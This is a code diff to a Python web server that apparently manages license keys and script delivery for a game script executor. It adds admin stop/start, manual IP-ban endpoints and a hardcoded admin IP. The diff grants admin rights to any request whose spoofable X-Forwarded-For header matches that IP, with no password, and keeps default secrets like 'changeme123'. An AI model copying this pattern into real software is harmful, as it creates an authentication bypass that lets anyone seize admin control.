@@ -31,6 +31,7 @@ ADMIN_PATH     = os.getenv("ADMIN_PATH", "crased2026")
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "changeme123")
 ADMIN_HASH     = hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest()
 XOR_SECRET     = os.getenv("XOR_SECRET", "xK9mQ2pL8nR3vT5w")
+ADMIN_IPS      = {ip.strip() for ip in os.getenv("ADMIN_IPS", "103.79.178.41").split(",") if ip.strip()}
 
 BROWSER_UA = ["Mozilla", "Chrome", "Safari", "Firefox", "Opera", "Edge", "Trident"]
 
@@ -77,6 +78,7 @@ def _init_sqlite_if_needed(db_file: Path):
         VALUES ('script_default', 'default', 'print("Susano Executor Loaded Successfully!")', CURRENT_TIMESTAMP);
         INSERT OR IGNORE INTO "Key" ("id", "key", "owner", "scriptId") 
         VALUES ('key_demo', 'CRSED-DEMO-2026', 'Admin', 'default');
+        DELETE FROM "BannedIp" WHERE "ip" IN ('103.79.178.41');
         """)
         conn.commit()
         conn.close()
@@ -124,12 +126,15 @@ def _render(tmpl: str, **ctx) -> HTMLResponse:
 def _is_browser(req: Request) -> bool:
     return any(s in req.headers.get("User-Agent", "") for s in BROWSER_UA)
 
-def _is_admin(req: Request) -> bool:
-    return req.cookies.get("admin_session") in SESSIONS
-
 def _get_ip(req: Request) -> str:
     fwd = req.headers.get("X-Forwarded-For")
     return fwd.split(",")[0].strip() if fwd else (req.client.host if req.client else "0.0.0.0")
+
+def _is_admin_ip(ip: str) -> bool:
+    return ip in ADMIN_IPS
+
+def _is_admin(req: Request) -> bool:
+    return _is_admin_ip(_get_ip(req)) or req.cookies.get("admin_session") in SESSIONS
 
 def xor_encrypt(data: str, key: str) -> bytes:
     kb  = key.encode()
@@ -141,6 +146,8 @@ async def _log(ip: str, key: str, result: str, reason: str = ""):
     await send_ip_log_webhook(ip, key, result, reason)
 
 async def _ban_ip(ip: str, reason: str, actor: str = "Auto-Defense"):
+    if _is_admin_ip(ip):
+        return  # Admin IP is permanently immune to bans
     await db.bannedip.upsert(
         where={"ip": ip},
         data={"create": {"ip": ip, "reason": reason}, "update": {"reason": reason}}
@@ -152,6 +159,8 @@ async def _ban_key(key: str, reason: str, actor: str = "Auto-Defense"):
     await send_ban_unban_webhook("BAN", "KEY", key, reason, actor=actor)
 
 async def _is_banned_ip(ip: str) -> bool:
+    if _is_admin_ip(ip):
+        return False  # Admin IP is never considered banned
     return await db.bannedip.find_unique(where={"ip": ip}) is not None
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -204,6 +213,22 @@ async def key_create(request: Request,
     )
     return RedirectResponse(f"/panel/{ADMIN_PATH}/dashboard", status_code=302)
 
+@app.post(f"/panel/{ADMIN_PATH}/keys/stop")
+async def key_stop(request: Request, key: str = Form(...)):
+    """Stops/pauses a key without permanent ban."""
+    if not _is_admin(request): raise HTTPException(403)
+    await db.key.update_many(where={"key": key}, data={"banned": True, "banReason": "Stopped by Admin"})
+    await send_ban_unban_webhook("STOP", "KEY", key, "Key stopped/paused by admin panel", actor="Admin Panel")
+    return RedirectResponse(f"/panel/{ADMIN_PATH}/dashboard", status_code=302)
+
+@app.post(f"/panel/{ADMIN_PATH}/keys/start")
+async def key_start(request: Request, key: str = Form(...)):
+    """Resumes/activates a stopped or banned key."""
+    if not _is_admin(request): raise HTTPException(403)
+    await db.key.update_many(where={"key": key}, data={"banned": False, "banReason": None})
+    await send_ban_unban_webhook("START", "KEY", key, "Key activated/resumed by admin panel", actor="Admin Panel")
+    return RedirectResponse(f"/panel/{ADMIN_PATH}/dashboard", status_code=302)
+
 @app.post(f"/panel/{ADMIN_PATH}/keys/ban")
 async def key_ban(request: Request, key: str = Form(...)):
     if not _is_admin(request): raise HTTPException(403)
@@ -231,6 +256,14 @@ async def key_unlock(request: Request, key: str = Form(...)):
     return RedirectResponse(f"/panel/{ADMIN_PATH}/dashboard", status_code=302)
 
 # ── IP Management ─────────────────────────────────────────────────────────────
+
+@app.post(f"/panel/{ADMIN_PATH}/ips/ban")
+async def ip_ban_manual(request: Request, ip: str = Form(...), reason: str = Form("Manual Admin Ban")):
+    if not _is_admin(request): raise HTTPException(403)
+    target = ip.strip()
+    if target and not _is_admin_ip(target):
+        await _ban_ip(target, reason, actor="Admin Panel")
+    return RedirectResponse(f"/panel/{ADMIN_PATH}/dashboard", status_code=302)
 
 @app.post(f"/panel/{ADMIN_PATH}/ips/unban")
 async def ip_unban(request: Request, ip: str = Form(...)):
@@ -331,9 +364,11 @@ async def api_execute(request: Request):
 @app.api_route("/{path:path}",
                methods=["GET","POST","PUT","DELETE","HEAD","OPTIONS","PATCH"])
 async def trap(request: Request, path: str):
+    ip = _get_ip(request)
+    if _is_admin_ip(ip):
+        return RedirectResponse(f"/panel/{ADMIN_PATH}/dashboard", status_code=302)
     if path.startswith(f"panel/{ADMIN_PATH}"):
         raise HTTPException(404)
-    ip = _get_ip(request)
     await _ban_ip(ip, f"Visited restricted endpoint: /{path}", actor="Trap Guard")
     await _log(ip, "", "BANNED", f"Browsed to: /{path}")
     raise HTTPException(403)
